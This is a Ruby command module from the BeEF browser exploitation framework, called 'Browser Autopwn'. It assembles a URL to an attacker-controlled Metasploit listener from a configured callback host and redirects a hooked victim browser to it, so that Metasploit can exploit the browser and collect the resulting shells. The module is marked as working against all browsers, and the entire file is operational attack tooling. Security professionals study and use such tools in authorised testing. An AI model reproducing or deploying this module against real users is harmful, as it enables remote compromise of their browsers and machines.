class Browser_autopwn < BeEF::Core::Command

  	#
  	# Defines and set up the command module.
  	#
	def initialize
		@conf = BeEF::Core::Configuration.instance
		@uri = 'Enter AutoPwn URL Here'
		begin
			if @conf.get('beef.extension.metasploit.enable')
				host = @conf.get('beef.extension.metasploit.callback_host')
				url = @conf.get('beef.extension.metasploit.autopwn_url')
				@uri = "http://#{host}:8080/#{url}"
			end
		end	
		super({
      'Name' => 'Browser Autopwn',
      'Description' => "This module will redirect a user to the autopwn port on a Metasploit listener and then rely on Metasploit to handle the resulting shells.  If the Metasploit extension is loaded, this module will pre-populate the URL to the pre-launched listener.  Otherwise, enter the URL you would like the user to be redirected to.",
      'Category' => 'Metasploit',
      'Author' => ['sussurro'],
			'Data' => [
			  { 'name' => 'sploit_url', 'ui_label' => 'Listener URL', 'value' => @uri, 'width'=>'200px' },
			],
	    'File' => __FILE__
    })

    set_target({
      'verified_status' =>  VERIFIED_WORKING, 
      'browser_name' =>     ALL
    })

    use 'beef.dom'
    use_template!
 
	end

  # This method is being called when a hooked browser sends some
  # data back to the framework.
  #
  def callback
    save({'result' => @datastore['result']})
  end
  
end
